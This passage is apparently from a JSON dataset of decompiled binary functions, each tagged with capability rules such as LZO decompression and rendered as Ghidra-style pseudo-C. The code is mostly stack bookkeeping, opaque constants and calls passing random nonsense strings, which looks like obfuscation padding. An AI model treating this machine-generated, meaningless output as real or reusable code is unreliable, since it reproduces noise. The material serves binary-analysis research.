fcn.00401e79(*(puVar1 + -0x84));\n    var_10h = 8;\n    *(puVar1 + -0x88) = \"hlfpjvyavrrprwyjginmhzicyvxytecjvgtyqvmqdfbcj\";\n    *(puVar1 + -0x8c) = 0x44ad2f;\n    fcn.00401e79(*(puVar1 + -0x88));\n    piVar3 = var_a0h;\n    *var_a0h = &fcn.0044ab30::var_50h;\n    piVar3[2] = 0x40d4be40;\n    piVar3[1] = 0;\n    *(piVar3 + 3) = 1;\n    piVar3[4] = 0x1214;\n    piVar3[0xc] = 0x40f01e80;\n    piVar3[0xb] = 0;\n    *(piVar3 + 0xd) = 0;\n    *(piVar3 + 0x14) = 0;\n    var_10h = 1;\n    *(puVar1 + -0x8c) = 0x44ad80;\n    fcn.00402716(*(puVar1 + -0x88));\n    puVar1 = var_a4h;\n    *(var_a4h + -4) = 0x44ad95;\n    fcn.00403b02();\n    *(puVar1 + -4) = 0x44ada0;\n    fcn.004068ed();\n    var_b0h = puVar1;\n    var_ach = puVar1 + -0x38;\n    var_a8h = puVar1 + -0x18;\n    *(puVar1 + -0x3c) =\n         \"gcnsfbivhszgopmdeovthrfdgxmwvhjhvdxvjbyfdvjhziyyfzxlmmkakdasgmiccrwusifwnfqxtyjaghntiuukdjmrgvavhsc\";\n    *(puVar1 + -0x40) = 0x44adce;\n    fcn.00401e79(*(puVar1 + -0x3c));\n    var_10h = 7;\n    *(puVar1 + -0x40) = \"qhtvpdbdyahikhddidqfheqsemdhflxccytxfdxuryjxcvispzoaatojstan\";\n    *(puVar1 + -0x44) = 0x44adf3;\n    fcn.00401e79(*(puVar1 + -0x40));\n    puVar4 = var_ach;\n    var_ach[1] = 0x40cc6280;\n    *puVar4 = 0;\n    var_10h = 1;\n    *(puVar1 + -0x44) = 0x44ae1d;\n    fcn.004035df(*(puVar1 + -0x40));\n    puVar2 = var_b0h;\n    var_b8h = var_b0h;\n    *(var_b0h + -4) = var_b0h;\n    var_b4h = puVar2 + -0x28;\n    *(puVar2 + -0x2c) = \"njokpwwqkknywlbtufbdfqbkravkebjdghknryweluharjqqzkfrbwqzfqnamqigessxddhdtjvfz\";\n    *(puVar2 + -0x30) = 0x44ae50;\n    fcn.00401e79(*(puVar2 + -0x2c));\n    puVar1 = var_b4h;\n    var_b4h[0x18] = 1;\n    *(puVar1 + 0x20) = 0x40dff800;\n    *(puVar1 + 0x1c) = 0;\n    *(puVar1 + 0x24) = 0x2575;\n    *(puVar2 + -0x30) = 0x44ae7f;\n    fcn.004029f0(*(puVar2 + -0x2c));\n    puVar2 = var_b8h;\n    *(var_b8h + -4) = 0x44ae97;\n    fcn.0040374c();\n    *(puVar2 + -0x18) = &fcn.0044ab30::var_68h;\n    *(puVar2 + -4) = 0x40e562c0;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0xc) = 0x40f12f40;\n    *(puVar2 + -0x10) = 0;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -0x1c) = 0x44aed4;\n    fcn.00402bd0(*(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8));\n    *(puVar2 + -0x1c) = 0x44aee1;\n    fcn.00403b02();\n    var_bch = puVar2 + -0x54;\n    var_c8h = puVar2 + -0x54;\n    *(puVar2 + -0x1c) = 0x40ed1ae0;\n    *(puVar2 + -0x20) = 0;\n    *(puVar2 + -0x28) = 0x40b6e700;\n    *(puVar2 + -0x2c) = 0;\n    *(puVar2 + -0x3c) = 0x40e13c00;\n    *(puVar2 + -0x40) = 0;\n    *(puVar2 + -0x44) = 0x40f422c0;\n    *(puVar2 + -0x48) = 0;\n    *(puVar2 + -0x4c) = 0x40d10200;\n    *(puVar2 + -0x50) = 0;\n    *(puVar2 + -0x24) = 1;\n    *(puVar2 + -0x30) = 0x11f;\n    *(puVar2 + -0x34) = 0;\n    *(puVar2 + -0x38) = 0x23a;\n    *(puVar2 + -0x54) = 1;\n    *(puVar2 + -0x58) = 0x44af5f;\n    fcn.00405e66(*(puVar2 + -0x54), *(puVar2 + -0x50), *(puVar2 + -0x4c), *(puVar2 + -0x48), *(puVar2 + -0x44), \n                 *(puVar2 + -0x40), *(puVar2 + -0x3c), *(puVar2 + -0x38), *(puVar2 + -0x34), *(puVar2 + -0x30), \n                 *(puVar2 + -0x2c), *(puVar2 + -0x28), *(puVar2 + -0x24), *(puVar2 + -0x20));\n    *(puVar2 + -0x58) = puVar2 + -0x54;\n    var_c4h = puVar2 + -0xc0;\n    var_c0h = puVar2 + -0x6c;\n    *(puVar2 + -0xc4) = \"tuakthvmhafrivrhftbcazhfrhhzvaintpxgzrjocqjgtfyfdycyqqpohixnocyqab\";\n    *(puVar2 + -200) = 0x44af93;\n    fcn.00401e79(*(puVar2 + -0xc4));\n    var_cch = var_c4h + 0x24;\n    var_10h = 5;\n    *(puVar2 + -200) = \"qnhkwbgptkxdpbawdpgcaodxfnds\";\n    *(puVar2 + -0xcc) = 0x44afbe;\n    fcn.00401e79(*(puVar2 + -200));\n    var_10h = 6;\n    *(puVar2 + -0xcc) = \"zhzoxinijombmrrbcltfhfzoxcezagoi\";\n    *(puVar2 + -0xd0) = 0x44afe3;\n    fcn.00401e79(*(puVar2 + -0xcc));\n    puVar1 = var_c4h;\n    *var_c4h = 1;\n    *(puVar1 + 0x1c) = 0x1bdc;\n    *(puVar1 + 0x20) = 0x4c7;\n    *(puVar1 + 0x40) = 0x40c8e380;\n    *(puVar1 + 0x3c) = 0;\n    *(puVar1 + 0x48) = 0x40aa1600;\n    *(puVar1 + 0x44) = 0;\n    *(puVar1 + 0x4c) = 0x314;\n    *(puVar1 + 0x50) = 0x5d;\n    var_10h = 1;\n    *(puVar2 + -0xd0) = 0x44b03b;\n    fcn.004049c6(*(puVar2 + -0xcc));\n    puVar1 = var_c8h;\n    puVar5 = var_c8h + -0xc;\n    puVar6 = var_c8h + -0xc;\n    *(var_c8h + -4) = 0x40d6f900;\n    *(puVar1 + -8) = 0;\n    *puVar5 = 0x276;\n    *(puVar1 + -0x10) = 0x44b06c;\n    fcn.0040680c(*puVar6, *(puVar1 + -8));\n    var_d8h = puVar1 + -0x20;\n    *(puVar1 + -0x14) = 0x40e95d60;\n    *(puVar1 + -0x18) = 0;\n    *(puVar1 + -0x10) = 1;\n    *(puVar1 + -0x1c) = 0x1af8;\n    *(puVar1 + -0x20) = 0;\n    *(puVar1 + -0x24) = 0x44b09e;\n    fcn.004031ca(*(puVar1 + -0x20), *(puVar1 + -0x1c), *(puVar1 + -0x18), *(puVar1 + -0x14), *(puVar1 + -0x10));\n    *(puVar1 + -0x24) = puVar1 + -0x20;\n    var_d4h = puVar1 + -0x80;\n    var_d0h = puVar1 + -0x44;\n    *(puVar1 + -0x84) = \"pnnbxekwljenlsvystwjvhqvesulldkfcjhniumnczmohdwwxlfqccedyheyoirpeiusdbapdot\";\n    *(puVar1 + -0x88) = 0x44b0d2;\n    fcn.00401e79(*(puVar1 + -0x84));\n    var_dch = var_d4h + 7;\n    var_10h = 3;\n    *(puVar1 + -0x88) = \"xfntrdgmdzqwzmufvelbljqdretkvxvzujrvmjztcgglcjpiifwzqpujjplkbptqwrnguuph\";\n    *(puVar1 + -0x8c) = 0x44b0fd;\n    fcn.00401e79(*(puVar1 + -0x88));\n    var_10h = 4;\n    *(puVar1 + -0x8c) = \"aibbplcjayoandeqkbkjqjigfvjwsmbvgccxnsacifhbzbofvbbvfvlihryhqllpmollwuonhtuawxgkuibig\";\n    *(puVar1 + -0x90) = 0x44b122;\n    fcn.00401e79(*(puVar1 + -0x8c));\n    piVar3 = var_d4h;\n    *var_d4h = &fcn.0044ab30::var_80h;\n    piVar3[0xe] = 0x40ba5300;\n    piVar3[0xd] = 0;\n    *(piVar3 + 0x15) = 0;\n    piVar3[0x17] = 0x40d6c140;\n    piVar3[0x16] = 0;\n    var_10h = 1;\n    *(puVar1 + -0x90) = 0x44b164;\n    fcn.0040251d(*(puVar1 + -0x8c));\n    puVar2 = var_d8h;\n    *(var_d8h + -4) = 0x44b179;\n    fcn.00403b02();\n    *(puVar2 + -4) = 0;\n    *(puVar2 + -8) = 1;\n    *(puVar2 + -0xc) = 0x44b196;\n    fcn.0040514b(*(puVar2 + -8), *(puVar2 + -4));\n    var_e8h = puVar2 + -0xc;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x10) = 0x44b1b3;\n    fcn.004057f4(*(puVar2 + -0xc));\n    var_e4h = puVar2 + -0x54;\n    var_e0h = puVar2 + -0x34;\n    *(puVar2 + -0x58) =\n         \"objnxerwacmxfjufsudaiyzafbhtedmeiuumiotvdfsifgymhdqnunwljgdbjiwkicdeimorxugegeauluoaycklxlwbfxi\";\n    *(puVar2 + -0x5c) = 0x44b1e1;\n    fcn.00401e79(*(puVar2 + -0x58));\n    var_10h = 2;\n    *(puVar2 + -0x5c) = \"qmdawntdzbyv\";\n    *(puVar2 + -0x60) = 0x44b203;\n    fcn.00401e79(*(puVar2 + -0x5c));\n    puVar1 = var_e4h;\n    *(var_e4h + 0x1c) = 0x40eadfa0;\n    *(puVar1 + 0x18) = 0;\n    *(puVar1 + 0x3c) = 0x40c43200;\n    *(puVar1 + 0x38) = 0;\n    *(puVar1 + 0x40) = 0x12b7;\n    *(puVar1 + 0x44) = 0x4fb;\n    *(puVar2 + -0x60) = 0x44b243;\n    fcn.004025bd(*(puVar2 + -0x5c));\n    puVar1 = var_e8h;\n    *(var_e8h + -4) = 0x44b258;\n    fcn.00403cf1();\n    var_10h = 1;\n    *(puVar1 + -4) = 0x12e2;\n    *(puVar1 + -8) = 0x44b275;\n    fcn.00401d0c(*(puVar1 + -4));\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0xc) = 0x145d;\n    *(puVar1 + -0x10) = 0x44b297;\n    fcn.00404089(*(puVar1 + -0xc), *(puVar1 + -8));\n    *in_FS_OFFSET = var_18h;\n    return var_8ch;\n}\n",
        "token_count": 5166
    },
    "0044cfe0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.0044cfe0(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar7;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uchar auStack252 [24];\n    uchar *puStack228;\n    uchar *var_d0h;\n    uchar *var_cch;\n    uchar *var_c8h;\n    uchar *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    uchar *var_b8h;\n    uchar *var_b4h;\n    uchar *var_b0h;\n    uchar *var_ach;\n    uchar *var_a8h;\n    uchar *var_a4h;\n    uchar *var_a0h;\n    uint *var_9ch;\n    uchar *var_98h;\n    uchar *var_94h;\n    uchar *var_90h;\n    uchar *var_8ch;\n    uchar *var_88h;\n    uint *var_84h;\n    uchar *var_80h;\n    uchar *var_7ch;\n    uchar *var_78h;\n    int32_t *var_74h;\n    uchar *var_70h;\n    uchar *var_6ch;\n    uchar *var_68h;\n    uchar *var_64h;\n    uchar *var_60h;\n    uchar *var_5ch;\n    uchar *var_58h;\n    uchar *var_54h;\n    uchar *var_50h;\n    uchar *var_4ch;\n    uchar *var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar5;\n    uchar *puVar6;\n    uint *puVar8;\n    uchar *puVar9;\n    \n    var_1ch = &fcn.0044cfe0::var_d0h;\n    var_10h = 0xffffffff;\n    var_14h = 0x4516e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0044cfe0::var_18h;\n    var_44h = param_1 + 0x18;\n    var_3ch = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_40h = var_3ch + 0x50;\n    fcn.004040a7();\n    var_10h = 1;\n    var_4ch = &stack0xffffff20;\n    puStack228 = 0x44d05c;\n    fcn.00406456(0xbd5, 0xd37, 0);\n    var_48h = &stack0xffffff04;\n    arg_8h = \"pvksflixsopflggywussyqrpxzvfggqvhqqdpueecaryfhkhfpctkoysdemtmhsqclqn\";\n    puStack228 = &stack0xffffff20;\n    fcn.00401e79(\"pvksflixsopflggywussyqrpxzvfggqvhqqdpueecaryfhkhfpctkoysdemtmhsqclqn\");\n    var_48h[0x18] = 1;\n    fcn.00404ceb(arg_8h);\n    puVar2 = var_4ch;\n    var_58h = var_4ch;\n    *(var_4ch + -4) = var_4ch;\n    var_54h = puVar2 + -0x5c;\n    var_50h = puVar2 + -0x20;\n    *(puVar2 + -0x60) = \"vlbplzbmrjalwig\";\n    *(puVar2 + -100) = 0x44d0c7;\n    fcn.00401e79(*(puVar2 + -0x60));\n    var_10h = 0xb;\n    *(puVar2 + -100) = \"octavicxleflqigqojcdexcszzeuaecaznhngteoqzpoeneykrikuwxe\";\n    *(puVar2 + -0x68) = 0x44d0e9;\n    fcn.00401e79(*(puVar2 + -100));\n    puVar1 = var_54h;\n    *var_54h = 0;\n    puVar1[4] = 0;\n    puVar1[8] = 1;\n    puVar1[0xc] = 1;\n    *(puVar1 + 0x2c) = 0x40e24a00;\n    *(puVar1 + 0x28) = 0;\n    *(puVar1 + 0x30) = 0x5f7;\n    *(puVar1 + 0x38) = 0x40e21020;\n    *(puVar1 + 0x34) = 0;\n    *(puVar1 + 0x58) = 0x40e96fe0;\n    *(puVar1 + 0x54) = 0;\n    *(puVar2 + -0x68) = 0x44d139;\n    fcn.00402edc(*(puVar2 + -100));\n    puVar2 = var_58h;\n    var_10h = 1;\n    var_5ch = var_58h + -0x28;\n    puVar4 = var_58h + -0x28;\n    puVar5 = var_58h + -0x28;\n    var_68h = var_58h + -0x28;\n    puVar6 = var_58h + -0x28;\n    *(var_58h + -0xc) = 0x40a22800;\n    *(puVar2 + -0x10) = 0;\n    *(puVar2 + -0x1c) = 0x40d71000;\n    *(puVar2 + -0x20) = 0;\n    *(puVar2 + -4) = 0xa90;\n    *(puVar2 + -8) = 0x247;\n    *(puVar2 + -0x14) = 1;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0x24) = 0;\n    *puVar4 = 0x3b7;\n    *(puVar2 + -0x2c) = 0x44d19a;\n    fcn.00401325(*puVar5, *(puVar2 + -0x24), *(puVar2 + -0x20), *(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14)\n                 , *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x2c) = puVar6;\n    var_64h = puVar2 + -0xa8;\n    var_60h = puVar2 + -0x44;\n    *(puVar2 + -0xac) = \"atftpyrysbwmwxyzdvnuhuwrukixjuqwjjdkcdh\";\n    *(puVar2 + -0xb0) = 0x44d1c5;\n    fcn.00401e79(*(puVar2 + -0xac));\n    var_6ch = var_64h + 0x44;\n    var_10h = 8;\n    *(puVar2 + -0xb0) = \"vgxnsyctlcdczodhkuacrcszdkddrkvogmoqjefvxvfzgyvmxyscdykvnobhwqvqoyomktlr\";\n    *(puVar2 + -0xb4) = 0x44d1ea;\n    fcn.00401e79(*(puVar2 + -0xb0));\n    var_70h = var_64h + 0x20;\n    var_10h = 9;\n    *(puVar2 + -0xb4) = \"fxvnh\";\n    *(puVar2 + -0xb8) = 0x44d20f;\n    fcn.00401e79(*(puVar2 + -0xb4));\n    var_10h = 10;\n    *(puVar2 + -0xb8) = \"bwrlcvoqbpxngdjbxundnustiokx\";\n    *(puVar2 + -0xbc) = 0x44d22e;\n    fcn.00401e79(*(puVar2 + -0xb8));\n    puVar1 = var_64h;\n    *(var_64h + 0x1c) = 0x40b30200;\n    *(puVar1 + 0x18) = 0;\n    puVar1[0x38] = 1;\n    puVar1[0x3c] = 1;\n    *(puVar1 + 0x40) = 0x1b23;\n    *(puVar1 + 0x60) = 0x40f1f6f0;\n    *(puVar1 + 0x5c) = 0;\n    puVar1[0x7c] = 1;\n    var_10h = 1;\n    *(puVar2 + -0xbc) = 0x44d274;\n    fcn.0040448a(*(puVar2 + -0xb8));\n    puVar1 = var_68h;\n    var_78h = var_68h;\n    *(var_68h + -4) = var_68h;\n    var_74h = puVar1 + -0x1c;\n    *(puVar1 + -0x20) = \"vknppyvykixnsyjhnuxpngpozmywmyudbfxshfmtlasmykgyymbvtrvttsgclafsabalkmjabuc\";\n    *(puVar1 + -0x24) = 0x44d2a1;\n    fcn.00401e79(*(puVar1 + -0x20));\n    *var_74h = &fcn.0044cfe0::var_38h;\n    *(puVar1 + -0x24) = 0x44d2b6;\n    fcn.00402a31(*(puVar1 + -0x20));\n    puVar2 = var_78h;\n    *(var_78h + -4) = 0x44d2c8;\n    fcn.00403b02();\n    var_80h = puVar2;\n    var_7ch = puVar2 + -0x2c;\n    *(puVar2 + -0x30) =\n         \"rzzokkwawzworztcovobhqxlztwablqkqlgfmnwdwgkyoqwhjrdzamiazcnougadueiutjfyiixaxtjhwcdlvaidjefqbujatue\";\n    *(puVar2 + -0x34) = 0x44d2e7;\n    fcn.00401e79(*(puVar2 + -0x30));\n    puVar1 = var_7ch;\n    *(var_7ch + 0x1c) = 0x40c6c900;\n    *(puVar1 + 0x18) = 0;\n    *(puVar1 + 0x24) = 0x40e22a40;\n    *(puVar1 + 0x20) = 0;\n    *(puVar1 + 0x28) = 0x124b;\n    *(puVar2 + -0x34) = 0x44d31a;\n    fcn.004046fb(*(puVar2 + -0x30));\n    puVar1 = var_80h;\n    var_88h = var_80h;\n    *(var_80h + -4) = var_80h;\n    var_84h = puVar1 + -0x44;\n    *(puVar1 + -0x48) = \"kplfnccztrro\";\n    *(puVar1 + -0x4c) = 0x44d348;\n    fcn.00401e79(*(puVar1 + -0x48));\n    puVar3 = var_84h;\n    var_84h[1] = 0x40d78180;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    *(puVar3 + 3) = 0;\n    puVar3[4] = 0x1257;\n    *(puVar3 + 5) = 1;\n    puVar3[6] = 0x12a;\n    puVar3[7] = 0xac;\n    puVar3[0xe] = 0x639;\n    puVar3[0x10] = 0x40b5fc00;\n    puVar3[0xf] = 0;\n    *(puVar1 + -0x4c) = 0x44d39e;\n    fcn.00403882(*(puVar1 + -0x48));\n    puVar2 = var_88h;\n    var_94h = var_88h;\n    *(var_88h + -4) = var_88h;\n    var_90h = puVar2 + -0x38;\n    var_8ch = puVar2 + -0x18;\n    *(puVar2 + -0x3c) = \"wsrydyotcfasapcmqwzgodxwlauoogdpxmpkjiasrxpmlelywqttlrljng\";\n    *(puVar2 + -0x40) = 0x44d3da;\n    fcn.00401e79(*(puVar2 + -0x3c));\n    var_10h = 7;\n    *(puVar2 + -0x40) = \"fwxauzdtqddwkluswkprdxsbgnyrunjlyflcghixxvxfwfxvdhvrdevk\";\n    *(puVar2 + -0x44) = 0x44d3fc;\n    fcn.00401e79(*(puVar2 + -0x40));\n    puVar1 = var_90h;\n    var_90h[0x18] = 1;\n    *(puVar1 + 0x1c) = 0x1032;\n    var_10h = 1;\n    *(puVar2 + -0x44) = 0x44d421;\n    fcn.00404561(*(puVar2 + -0x40));\n    puVar1 = var_94h;\n    var_a0h = var_94h;\n    *(var_94h + -4) = var_94h;\n    var_9ch = puVar1 + -0x50;\n    var_98h = puVar1 + -0x20;\n    *(puVar1 + -0x54) = \"thdmvfkiqysmdugxihshghocpimpuubmznjfhhymttsbafwb\";\n    *(puVar1 + -0x58) = 0x44d45d;\n    fcn.00401e79(*(puVar1 + -0x54));\n    var_10h = 6;\n    *(puVar1 + -0x58) = \"qpzyjetpebroxqtxwpuedzzfskmuskkjvjusntrwvjwkctnbmbvrwgrdaykbfn\";\n    *(puVar1 + -0x5c) = 0x44d482;\n    fcn.00401e79(*(puVar1 + -0x58));\n    puVar3 = var_9ch;\n    *var_9ch = 0x1623;\n    puVar3[1] = 0xe8a;\n    *(puVar3 + 8) = 1;\n    puVar3[9] = 0x1357;\n    puVar3[0xb] = 0x40e18da0;\n    puVar3[10] = 0;\n    puVar3[0x13] = 0x40ddb7c0;\n    puVar3[0x12] = 0;\n    var_10h = 1;\n    *(puVar1 + -0x5c) = 0x44d4d0;\n    fcn.00405cd1(*(puVar1 + -0x58));\n    puVar2 = var_a0h;\n    var_ach = var_a0h;\n    *(var_a0h + -4) = var_a0h;\n    var_a8h = puVar2 + -0x5c;\n    var_a4h = puVar2 + -0x2c;\n    *(puVar2 + -0x60) = \"bmijnfeowqkdplmdcdlrtdkofpmalhfehgsdiowrfjryyxpduw\";\n    *(puVar2 + -100) = 0x44d50c;\n    fcn.00401e79(*(puVar2 + -0x60));\n    var_b0h = var_a8h + 0x18;\n    var_10h = 4;\n    *(puVar2 + -100) = \"zecwqbyhybeepbshsfovypjofoppoqmbutxhxbzsgfnatnsqwpqawize\";\n    *(puVar2 + -0x68) = 0x44d537;\n    fcn.00401e79(*(puVar2 + -100));\n    var_10h = 5;\n    *(puVar2 + -0x68) = \"cvxxnmtkmohpenfmmlpfgq\";\n    *(puVar2 + -0x6c) = 0x44d559;\n    fcn.00401e79(*(puVar2 + -0x68));\n    puVar1 = var_a8h;\n    *(var_a8h + 0x4c) = 0x40ca1600;\n    *(puVar1 + 0x48) = 0;\n    *(puVar1 + 0x50) = 0x819;\n    *(puVar1 + 0x58) = 0x40f2c3d0;\n    *(puVar1 + 0x54) = 0;\n    var_10h = 1;\n    *(puVar2 + -0x6c) = 0x44d596;\n    fcn.00401cb7(*(puVar2 + -0x68));\n    puVar2 = var_ach;\n    var_b8h = var_ach;\n    *(var_ach + -4) = var_ach;\n    var_b4h = puVar2 + -0x24;\n    *(puVar2 + -0x28) =\n         \"xkwbbukxwtrzjadxhhajvrxloqtwrqjvnbhzaigotjzstnicvofogertqizdvxvpjnvhboctythqbfqmftsheekvgsqpsktjysuk\";\n    *(puVar2 + -0x2c) = 0x44d5cc;\n    fcn.00401e79(*(puVar2 + -0x28));\n    puVar1 = var_b4h;\n    *var_b4h = 0;\n    *(puVar1 + 8) = 0x40f05150;\n    *(puVar1 + 4) = 0;\n    *(puVar2 + -0x2c) = 0x44d5f0;\n    fcn.00403049(*(puVar2 + -0x28));\n    puVar2 = var_b8h;\n    var_c4h = var_b8h;\n    *(var_b8h + -4) = var_b8h;\n    var_c0h = puVar2 + -0x74;\n    var_bch = puVar2 + -0x34;\n    *(puVar2 + -0x78) = \"ekwlxcyfzepuseyyhkvbfgfoiefswqsccnzzmexkqsuxblpfffggdmkfbeejzlfabfrzeqtrfhxsrj\";\n    *(puVar2 + -0x7c) = 0x44d627;\n    fcn.00401e79(*(puVar2 + -0x78));\n    var_c8h = var_c0h + 0x28;\n    var_10h = 2;\n    *(puVar2 + -0x7c) = \"qmsuikmgcxwxigaautwuienlgiajfybajgymrjgdzcmzsopvvxhgtluwrwwqzeptvpxqtsywfrqzuyughigd\";\n    *(puVar2 + -0x80) = 0x44d652;\n    fcn.00401e79(*(puVar2 + -0x7c));\n    var_10h = 3;\n    *(puVar2 + -0x80) = \"sdvbcrvbmgfxchiwbz\";\n    *(puVar2 + -0x84) = 0x44d674;\n    fcn.00401e79(*(puVar2 + -0x80));\n    puVar1 = var_c0h;\n    *(var_c0h + 0x18) = 0x166f;\n    *(puVar1 + 0x20) = 0x40ba0f00;\n    *(puVar1 + 0x1c) = 0;\n    puVar1[0x24] = 1;\n    *(puVar1 + 0x5c) = 0x40a4c000;\n    *(puVar1 + 0x58) = 0;\n    *(puVar1 + 100) = 0x40c1ce00;\n    *(puVar1 + 0x60) = 0;\n    *(puVar1 + 0x68) = 0x830;\n    *(puVar1 + 0x70) = 0x40b18c00;\n    *(puVar1 + 0x6c) = 0;\n    var_10h = 1;\n    *(puVar2 + -0x84) = 0x44d6d8;\n    fcn.00402e2d(*(puVar2 + -0x80));\n    puVar1 = var_c4h;\n    puVar7 = var_c4h + -0x18;\n    puVar8 = var_c4h + -0x18;\n    var_d0h = var_c4h + -0x18;\n    puVar9 = var_c4h + -0x18;\n    *(var_c4h + -4) = 0x40de2fc0;\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0x10) = 0x40ef2240;\n    *(puVar1 + -0x14) = 0;\n    *(puVar1 + -0xc) = 0x33a;\n    *puVar7 = 0x440;\n    *(puVar1 + -0x1c) = 0x44d71b;\n    fcn.00406109(*puVar8, *(puVar1 + -0x14), *(puVar1 + -0x10), *(puVar1 + -0xc), *(puVar1 + -8));\n    *(puVar1 + -0x1c) = puVar9;\n    var_cch = puVar1 + -0x34;\n    *(puVar1 + -0x38) = \"wegigthpqnxgjsrtjodspufsgrotphxltteuxzwiwbijtuxldtng\";\n    *(puVar1 + -0x3c) = 0x44d748;\n    fcn.00401e79(*(puVar1 + -0x38));\n    var_cch[0x18] = 0;\n    *(puVar1 + -0x3c) = 0x44d75f;\n    fcn.00404d86(*(puVar1 + -0x38));\n    *in_FS_OFFSET = var_18h;\n    return var_3ch;\n}\n",
        "token_count": 5549
    },
    "0044f690": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.0044f690(void)\n\n{\n    uint *puVar1;\n    uchar *puVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    int32_t aiStack432 [23];\n    uchar auStack340 [28];\n    uint uStack312;\n    uchar *var_124h;\n    uint *var_120h;\n    uchar *var_11ch;\n    int32_t *var_118h;\n    uchar *var_114h;\n    uchar *var_110h;\n    uchar *var_10ch;\n    uchar *var_108h;\n    uchar *var_104h;\n    uchar *var_100h;\n    uint *var_fch;\n    uchar *var_f8h;\n    int32_t *var_f4h;\n    uchar *var_f0h;\n    int32_t *var_ech;\n    uchar *var_e8h;\n    int32_t *var_e4h;\n    int32_t *var_e0h;\n    uchar *var_dch;\n    int32_t *var_d8h;\n    uchar *var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_b0h;\n    uint var_98h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_1ch = &fcn.0044f690::var_124h;\n    var_10h = 0xffffffff;\n    var_14h = 0x4518c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0044f690::var_18h;\n    fcn.004040a7();\n    var_10h = 0;\n    var_dch = &stack0xfffffecc;\n    uStack312 = 0x44f705;\n    fcn.00401659(&fcn.0044f690::var_38h, 0x12fd, 0xfe9);\n    uStack312 = 0x44f712;\n    fcn.00403b02();\n    var_d8h = &stack0xfffffe50;\n    var_d4h = &stack0xfffffeac;\n    fcn.00401e79(\"jnbxcaseschintuwyddvattqzrdjwdlaoxpcwudewsrgzmbhfymiqzb\");\n    var_e0h = var_d8h + 0x10;\n    var_10h = 5;\n    fcn.00401e79(\"btttwpslsrqpufybvjksuxhzmgjkcfnjykoqgpetjgfofmbfrfpvvzobizbrubojgmpooylnalxhopjfgmuzrbiojz\");\n    var_e4h = var_d8h + 10;\n    var_10h = 6;\n    fcn.00401e79(\"cieercbfiwjakzmgdmtlzttuhrvhvectyezgcfommvdbeplcotvpbi\");\n    var_10h = 7;\n    arg_8h = \"igrptrfwqnivtmxwjyzcenmdksllplsrzzstjiekmkudk\";\n    fcn.00401e79(\"igrptrfwqnivtmxwjyzcenmdksllplsrzzstjiekmkudk\");\n    piVar3 = var_d8h;\n    *var_d8h = &fcn.0044f690::var_50h;\n    *(piVar3 + 1) = 0;\n    piVar3[2] = 0x1e6c;\n    piVar3[9] = 0x1a9a;\n    piVar3[0x16] = 0xd02;\n    piVar3[0x1e] = 0x40d00400;\n    piVar3[0x1d] = 0;\n    var_10h = 0;\n    fcn.0040670d(arg_8h);\n    puVar2 = var_dch;\n    *(var_dch + -4) = 0x44f819;\n    fcn.00403b02();\n    var_f0h = puVar2;\n    var_ech = puVar2 + -0x70;\n    var_e8h = puVar2 + -0x1c;\n    *(puVar2 + -0x74) =\n         \"fqagelmxdmytfjukyfybmoqcyjhvdclzwsxcrzcgbhuqxrtbsucnoxrlgdmfedkvhsnewenbrxdhriltfjrqzbysyerwmhid\";\n    *(puVar2 + -0x78) = 0x44f847;\n    fcn.00401e79(*(puVar2 + -0x74));\n    var_f4h = var_ech + 9;\n    var_10h = 3;\n    *(puVar2 + -0x78) = \"hlavfuhtkgsgzofmz\";\n    *(puVar2 + -0x7c) = 0x44f872;\n    fcn.00401e79(*(puVar2 + -0x78));\n    var_10h = 4;\n    *(puVar2 + -0x7c) = \"fjuxfvxqmstdgiwcfyoxowrbw\";\n    *(puVar2 + -0x80) = 0x44f897;\n    fcn.00401e79(*(puVar2 + -0x7c));\n    piVar3 = var_ech;\n    *var_ech = &fcn.0044f690::var_68h;\n    piVar3[1] = 0x7c8;\n    piVar3[2] = 0x97f;\n    *(piVar3 + 0xf) = 1;\n    piVar3[0x11] = 0x40e52280;\n    piVar3[0x10] = 0;\n    piVar3[0x13] = 0x40d8ac00;\n    piVar3[0x12] = 0;\n    *(piVar3 + 0x14) = 1;\n    *(piVar3 + 0x1b) = 1;\n    var_10h = 0;\n    *(puVar2 + -0x80) = 0x44f8ef;\n    fcn.004054e3(*(puVar2 + -0x7c));\n    puVar2 = var_f0h;\n    *(var_f0h + -4) = 0x44f904;\n    fcn.00403b02();\n    var_100h = 